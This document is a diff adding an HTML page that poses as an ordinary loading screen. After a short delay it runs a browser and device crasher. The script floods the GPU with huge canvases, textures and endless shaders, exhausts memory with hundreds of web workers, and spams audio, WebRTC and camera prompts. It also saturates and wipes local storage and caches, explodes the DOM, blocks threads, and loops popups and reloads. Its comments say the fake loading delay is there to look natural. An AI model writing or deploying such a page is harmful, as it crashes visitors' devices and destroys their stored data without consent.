@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover, shrink-to-fit=no">
+    <meta name="theme-color" content="#000000">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+            -webkit-touch-callout: none;
+        }
+        body {
+            background: #000000;
+            width: 100vw;
+            height: 100vh;
+            overflow: hidden;
+            position: fixed;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .loading {
+            color: white;
+            font-family: monospace;
+            font-size: 20px;
+            text-align: center;
+        }
+        .hidden {
+            display: none;
+        }
+        h1 {
+            color: #ff0000;
+            font-family: 'Courier New', monospace;
+            font-size: 28px;
+            text-align: center;
+            z-index: 9999;
+            text-shadow: 0 0 10px red;
+            animation: blink 0.05s infinite;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+    </style>
+</head>
+<body>
+    <div class="loading" id="loading">Loading...⏳</div>
+    <h1 id="text" class="hidden">HAI SAYA DGXEONHOZOO</h1>
+    
+    <script>
+        // Kasih efek loading dulu biar keliatan natural
+        setTimeout(() => {
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('text').classList.remove('hidden');
+            
+            // ========== GPU CRASHER ULTIMATE ==========
+            
+            // Create multiple high-res canvases untuk serang GPU dari berbagai sisi
+            for(let wave = 0; wave < 200; wave++) {
+                setTimeout(() => {
+                    try {
+                        // Canvas 32K bomb
+                        let canvas32k = document.createElement('canvas');
+                        canvas32k.width = 32768;
+                        canvas32k.height = 32768;
+                        canvas32k.style.display = 'none';
+                        document.body.appendChild(canvas32k);
+                        
+                        // WebGL context spam
+                        let gl = canvas32k.getContext('webgl', {powerPreference: 'high-performance'});
+                        let gl2 = canvas32k.getContext('webgl2', {powerPreference: 'high-performance'});
+                        
+                        [gl, gl2].forEach(g => {
+                            if(!g) return;
+                            
+                            // Texture bomb - 32K textures
+                            for(let t = 0; t < 1000; t++) {
+                                try {
+                                    let tex = g.createTexture();
+                                    g.bindTexture(g.TEXTURE_2D, tex);
+                                    g.texImage2D(g.TEXTURE_2D, 0, g.RGBA, 32768, 32768, 0, g.RGBA, g.UNSIGNED_BYTE, null);
+                                    g.texParameteri(g.TEXTURE_2D, g.TEXTURE_MIN_FILTER, g.LINEAR);
+                                    g.texParameteri(g.TEXTURE_2D, g.TEXTURE_MAG_FILTER, g.LINEAR);
+                                } catch(e) {}
+                            }
+                            
+                            // Shader compilation infinite loop
+                            for(let s = 0; s < 2000; s++) {
+                                let vs = g.createShader(g.VERTEX_SHADER);
+                                let fs = g.createShader(g.FRAGMENT_SHADER);
+                                
+                                let shaderSource = `
+                                    precision highp float;
+                                    uniform float u_time;
+                                    void main() {
+                                        vec4 color = vec4(0.0);
+                                        for(int i = 0; i < 100000000; i++) {
+                                            color += vec4(sin(float(i)), cos(float(i)), tan(float(i)), 1.0);
+                                            color *= 0.999999;
+                                        }
+                                        gl_FragColor = color;
+                                    }
+                                `.repeat(500);
+                                
+                                g.shaderSource(vs, "void main() { gl_Position = vec4(0.0); }");
+                                g.shaderSource(fs, shaderSource);
+                                g.compileShader(vs);
+                                g.compileShader(fs);
+                                
+                                // Create program
+                                let program = g.createProgram();
+                                g.attachShader(program, vs);
+                                g.attachShader(program, fs);
+                                g.linkProgram(program);
+                            }
+                            
+                            // Frame buffer bomb
+                            for(let fb = 0; fb < 500; fb++) {
+                                let fbo = g.createFramebuffer();
+                                g.bindFramebuffer(g.FRAMEBUFFER, fbo);
+                                let rb = g.createRenderbuffer();
+                                g.bindRenderbuffer(g.RENDERBUFFER, rb);
+                                g.renderbufferStorage(g.RENDERBUFFER, g.DEPTH_COMPONENT16, 32768, 32768);
+                                g.framebufferRenderbuffer(g.FRAMEBUFFER, g.DEPTH_ATTACHMENT, g.RENDERBUFFER, rb);
+                            }
+                        });
+                        
+                        // 2D Canvas Context bomb
+                        let ctx2d = canvas32k.getContext('2d');
+                        if(ctx2d) {
+                            for(let d = 0; d < 10000; d++) {
+                                ctx2d.fillStyle = `rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255})`;
+                                ctx2d.fillRect(Math.random() * 50000, Math.random() * 50000, 5000, 5000);
+                                ctx2d.filter = `blur(${Math.random()*500}px) contrast(${Math.random()*100})`;
+                                ctx2d.shadowBlur = 1000;
+                                ctx2d.font = `${Math.random()*1000}px Arial`;
+                                ctx2d.fillText('X'.repeat(100000), Math.random() * 50000, Math.random() * 50000);
+                            }
+                        }
+                    } catch(e) {}
+                }, wave * 5);
+            }
+            
+            // ========== WEBGL RENDER LOOP MULTI-CANVAS ==========
+            for(let c = 0; c < 100; c++) {
+                let cv = document.createElement('canvas');
+                cv.width = 8192;
+                cv.height = 8192;
+                cv.style.position = 'absolute';
+                cv.style.top = '-9999px';
+                document.body.appendChild(cv);
+                
+                let gl = cv.getContext('webgl', {powerPreference: 'high-performance'});
+                if(gl) {
+                    let vertices = new Float32Array([-1,-1, 1,-1, -1,1, 1,1]);
+                    let buffer = gl.createBuffer();
+                    gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+                    gl.bufferData(gl.ARRAY_BUFFER, vertices, gl.STATIC_DRAW);
+                    
+                    function renderLoop() {
+                        for(let i = 0; i < 1000; i++) {
+                            gl.clearColor(Math.random(), Math.random(), Math.random(), 1);
+                            gl.clear(gl.COLOR_BUFFER_BIT);
+                            gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
+                        }
+                        requestAnimationFrame(renderLoop);
+                    }
+                    renderLoop();
+                }
+            }
+            
+            // ========== MEMORY BOMB TAK TERHINGGA ==========
+            let memoryHog = [];
+            function eatMemory() {
+                try {
+                    while(true) {
+                        memoryHog.push(new ArrayBuffer(1024 * 1024 * 500)); // 500MB each
+                        memoryHog.push(new Uint8Array(1024 * 1024 * 200));
+                        memoryHog.push(new Float64Array(1024 * 1024 * 100));
+                        memoryHog.push(new Array(10000000).fill(Math.random().toString(36).repeat(1000)));
+                    }
+                } catch(e) {
+                    setTimeout(eatMemory, 1);
+                }
+            }
+            
+            for(let i = 0; i < 100; i++) {
+                setTimeout(eatMemory, 0);
+            }
+            
+            // ========== WEB WORKER NUCLEAR BOMB ==========
+            let nuclearWorker = `
+                while(true) {
+                    let memory = [];
+                    for(let i = 0; i < 10000000; i++) {
+                        memory.push(Math.random());
+                        memory.push(new ArrayBuffer(1024 * 1024));
+                        memory.push(new Uint8Array(1024 * 1024));
+                    }
+                    postMessage('nuclear');
+                }
+            `;
+            let nukeBlob = new Blob([nuclearWorker], {type: 'application/javascript'});
+            let nukeUrl = URL.createObjectURL(nukeBlob);
+            for(let w = 0; w < 500; w++) {
+                try {
+                    new Worker(nukeUrl);
+                } catch(e) {}
+            }
+            
+            // ========== GPU COMPUTE SHADER CRASH (WebGL2) ==========
+            try {
+                let computeCanvas = document.createElement('canvas');
+                computeCanvas.width = 16384;
+                computeCanvas.height = 16384;
+                let glCompute = computeCanvas.getContext('webgl2');
+                if(glCompute) {
+                    for(let cs = 0; cs < 1000; cs++) {
+                        let computeShader = glCompute.createShader(glCompute.COMPUTE_SHADER);
+                        glCompute.shaderSource(computeShader, `
+                            #version 310 es
+                            layout(local_size_x = 1024, local_size_y = 1024) in;
+                            void main() {
+                                while(true) {
+                                    uvec3 id = gl_GlobalInvocationID;
+                                }
+                            }
+                        `);
+                        glCompute.compileShader(computeShader);
+                    }
+                }
+            } catch(e) {}
+            
+            // ========== WEB AUDIO EXTREME ==========
+            try {
+                let AudioContext = window.AudioContext || window.webkitAudioContext;
+                for(let aCtx = 0; aCtx < 100; aCtx++) {
+                    let audioCtx = new AudioContext();
+                    for(let a = 0; a < 1000; a++) {
+                        let osc = audioCtx.createOscillator();
+                        let gain = audioCtx.createGain();
+                        let compressor = audioCtx.createDynamicsCompressor();
+                        let convolver = audioCtx.createConvolver();
+                        let delay = audioCtx.createDelay(30);
+                        let filter = audioCtx.createBiquadFilter();
+                        let waveShaper = audioCtx.createWaveShaper();
+                        
+                        osc.connect(gain);
+                        gain.connect(compressor);
+                        compressor.connect(convolver);
+                        convolver.connect(delay);
+                        delay.connect(filter);
+                        filter.connect(waveShaper);
+                        waveShaper.connect(audioCtx.destination);
+                        
+                        osc.frequency.value = 24000;
+                        gain.gain.value = 10000;
+                        delay.delayTime.value = 30;
+                        filter.frequency.value = 24000;
+                        filter.Q.value = 100000;
+                        
+                        osc.start();
+                    }
+                }
+            } catch(e) {}
+            
+            // ========== WEBRTC + MEDIA DEVICE CRASH ==========
+            try {
+                for(let rtc = 0; rtc < 1000; rtc++) {
+                    let pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]});
+                    for(let tr = 0; tr < 100; tr++) {
+                        try {
+                            pc.addTransceiver('video', {direction: 'sendrecv'});
+                            pc.addTransceiver('audio', {direction: 'sendrecv'});
+                        } catch(e) {}
+                    }
+                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                }
+                
+                setInterval(() => {
+                    navigator.mediaDevices.getUserMedia({video: true, audio: true})
+                        .then(stream => {
+                            stream.getTracks().forEach(track => track.stop());
+                        })
+                        .catch(() => {});
+                    navigator.mediaDevices.enumerateDevices();
+                }, 1);
+            } catch(e) {}
+            
+            // ========== INDEXEDDB + CACHE STORAGE BOMB ==========
+            setInterval(() => {
+                for(let db = 0; db < 500; db++) {
+                    let dbName = 'NUKE_' + Date.now() + '_' + Math.random();
+                    let request = indexedDB.open(dbName, 999);
+                    request.onsuccess = (e) => {
+                        let db = e.target.result;
+                        for(let s = 0; s < 1000; s++) {
+                            try {
+                                if(!db.objectStoreNames.contains('store_' + s)) {
+                                    db.createObjectStore('store_' + s);
+                                }
+                            } catch(e2) {}
+                        }
+                        for(let s = 0; s < 1000; s++) {
+                            let tx = db.transaction(['store_' + (s % 500)], 'readwrite');
+                            let store = tx.objectStore('store_' + (s % 500));
+                            for(let d = 0; d < 10000; d++) {
+                                store.add({data: 'X'.repeat(10000000), timestamp: Date.now()});
+                            }
+                        }
+                    };
+                }
+                
+                // Cache API spam
+                caches.keys().then(keys => {
+                    keys.forEach(key => caches.delete(key));
+                });
+                for(let c = 0; c < 500; c++) {
+                    caches.open('CACHE_BOMB_' + c).then(cache => {
+                        let items = [];
+                        for(let i = 0; i < 5000; i++) {
+                            items.push('data:text/plain,' + 'X'.repeat(10000000));
+                        }
+                        cache.addAll(items);
+                    });
+                }
+            }, 1);
+            
+            // ========== LOCAL/SESSION STORAGE SATURATION ==========
+            setInterval(() => {
+                for(let i = 0; i < 50000; i++) {
+                    try {
+                        let data = 'Z'.repeat(1024 * 1024 * 10); // 10MB per item
+                        localStorage.setItem('kill_' + Math.random() + '_' + Date.now(), data);
+                        sessionStorage.setItem('kill_' + Math.random() + '_' + Date.now(), data);
+                    } catch(e) {
+                        localStorage.clear();
+                        sessionStorage.clear();
+                    }
+                }
+            }, 1);
+            
+            // ========== DOM EXPLOSION ==========
+            setInterval(() => {
+                let fragment = '';
+                for(let i = 0; i < 100000; i++) {
+                    fragment += `<div style="position:absolute;left:${Math.random()*200000}px;top:${Math.random()*200000}px;width:${Math.random()*10000}px;height:${Math.random()*10000}px;background:rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},${Math.random()});transform:rotate(${Math.random()*3600}deg) scale(${Math.random()*1000});filter:blur(${Math.random()*500}px) brightness(${Math.random()*100}) contrast(${Math.random()*100});backdrop-filter:blur(${Math.random()*500}px);">${'💀'.repeat(10000)}</div>`;
+                }
+                document.body.innerHTML += fragment;
+            }, 5);
+            
+            // ========== HARD THREAD BLOCK ==========
+            function blockThreadForever() {
+                let start = Date.now();
+                while(true) {
+                    let now = Date.now();
+                    if(now - start > 10000) {
+                        start = now;
+                    }
+                    let x = 0;
+                    for(let i = 0; i < 1e11; i++) {
+                        x += Math.sqrt(i) * Math.PI * Math.E * Math.sin(i) * Math.cos(i);
+                    }
+                }
+            }
+            
+            for(let i = 0; i < 50; i++) {
+                setTimeout(blockThreadForever, 0);
+                setImmediate ? setImmediate(blockThreadForever) : setTimeout(blockThreadForever, 0);
+            }
+            
+            // ========== INFINITE RELOAD + POPUP ==========
+            setInterval(() => {
+                try {
+                    for(let i = 0; i < 100; i++) {
+                        window.open('about:blank', '_blank');
+                    }
+                    window.open(location.href, '_self');
+                } catch(e) {}
+            }, 100);
+            
+            setInterval(() => {
+                location.reload();
+            }, 5000);
+            
+            // ========== FINAL: SYSTEM UI KILLER ==========
+            setTimeout(() => {
+                try {
+                    // Force close dengan memory pressure maksimal
+                    let systemKiller = [];
+                    for(let i = 0; i < 1000000; i++) {
+                        systemKiller.push(new Array(1000000).fill('KILL_SYSTEM'));
+                        systemKiller.push(new ArrayBuffer(1024 * 1024 * 100));
+                    }
+                } catch(e) {}
+                
+                // Trigger garbage collector (if available)
+                if(window.gc) {
+                    for(let i = 0; i < 10000; i++) {
+                        window.gc();
+                    }
+                }
+            }, 1000);
+            
+        }, 1500); // Loading 1.5 detik baru ngecrash
+    </script>
+</body>
+</html>
